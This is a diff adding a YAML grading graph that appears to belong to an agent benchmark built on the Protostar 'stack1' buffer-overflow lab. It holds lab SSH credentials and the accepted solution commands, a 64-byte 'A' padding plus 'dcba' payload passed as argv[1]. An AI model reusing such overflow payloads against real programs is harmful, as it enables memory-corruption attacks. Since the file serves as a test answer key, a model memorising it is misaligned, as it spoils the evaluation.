@@ -1,0 +1,82 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: protostar_stack1
+  name: Protostar Stack One
+  description: Overflow the stack buffer passed as argv[1] so that modified becomes 0x61626364.
+attacker_context:
+  user: user
+  access:
+    method: ssh
+    credentials:
+      username: user
+      password: user
+  target:
+    host: <target-hostname-or-ip>
+    port: 22
+goal:
+  node: node2
+irrelevant_commands:
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- man
+- strings
+- checksec
+- file
+- ls
+- ls -la
+- env
+- printenv
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: Target value identified
+- id: node1
+  type: state
+  label: Payload layout prepared
+- id: node2
+  type: state
+  label: modified set to 0x61626364
+edges:
+- id: edge0
+  from: start
+  to: node0
+  action: identify_required_integer_value
+  accepted_commands:
+  - objdump -d /opt/protostar/bin/stack1 | grep -i modified
+  - gdb -q /opt/protostar/bin/stack1
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+- id: edge1
+  from: node0
+  to: node1
+  action: build_argument_payload
+  accepted_commands:
+  - python -c 'print "A"*64 + "dcba"'
+  - perl -e 'print "A"x64, "dcba"'
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge2
+  from: node1
+  to: node2
+  action: run_program_with_overflow_argument
+  accepted_commands:
+  - /opt/protostar/bin/stack1 $(python -c 'print "A"*64 + "dcba"')
+  - /opt/protostar/bin/stack1 $(perl -e 'print "A"x64, "dcba"')
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*you have correctly got the variable to the right value.*
+    stderr_regex: ^$
